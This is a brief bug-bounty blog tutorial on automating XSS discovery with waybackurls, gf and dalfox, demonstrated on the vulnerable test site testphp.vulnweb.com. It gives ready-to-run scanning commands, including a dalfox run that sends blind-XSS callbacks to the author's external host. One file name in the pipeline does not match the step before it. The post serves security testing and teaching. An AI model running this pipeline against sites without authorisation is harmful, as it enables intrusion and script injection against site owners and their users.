---
title: "Automating XSS using Dalfox GF and WaybackURLs"
AuthorId: "1"
Date: "2022-05-20"
tags:
  - bugbounty, bypass-tips, rate-limit
---

---

Hello Everyone! 😄
Hope you all are good.
Automating Stuff is always fun so Why not XSS. All you need is "Go Lang" installed on your machine and you are ready to go.

![GIF](https://media3.giphy.com/media/dsLRESPtvjHdO5odzM/giphy.gif?cid=ecf05e47uq8qwwm3m2sb91loc79d96ias7cu4t4up0ysh3lx&rid=giphy.gif&ct=g)

## Pre-Requisites :
- GF by TomNomNom
- GF Patterns by Shiv Chouhan
- WayBackURLs by TomNomNom
- Dalfox by HAHWUL

## Workflow

- After Installation of all above mentioned tools, Choose your Target. Let's use "http://testphp.vulnweb.com/" for demonstration purposes.

- Use Waybackurls to fetch URL's for the chosen target and save the Output in a text file.

```bash
echo "testphp.vulnweb.com" | waybackurls | tee testphp.txt
```

- Use GF Patterns to find URLs that give you XSS and Use sed command to get our URLs ready for the Dalfox

```bash
cat test.txt | gf xss | sed 's/=.*/=/' | sed 's/URL: //' | tee testxss.txt
```

- Time to fire Dalfox and start finding XSS.

    
```bash
dalfox file testxss.txt -b tigv2.xss.ht pipe
```

- Make sure you replace my Blind XSS Hunter Payload with that of yours.

## Automating Workflow using Bash

I have created a Bash Script to automate the above steps. Check it out.

> Github Repo : [https://github.com/theinfosecguy/quickxss](https://github.com/theinfosecguy/quickxss)

## One Step Installation using Docker

Setting up all the tools and dependencies is a bit cumbersome. Use the Docker Image to do it in one step.

```bash
docker build --tag quickxss .
docker run -it --rm --name qs quickxss
```

Hope you liked it.

Thanks for reading. 😄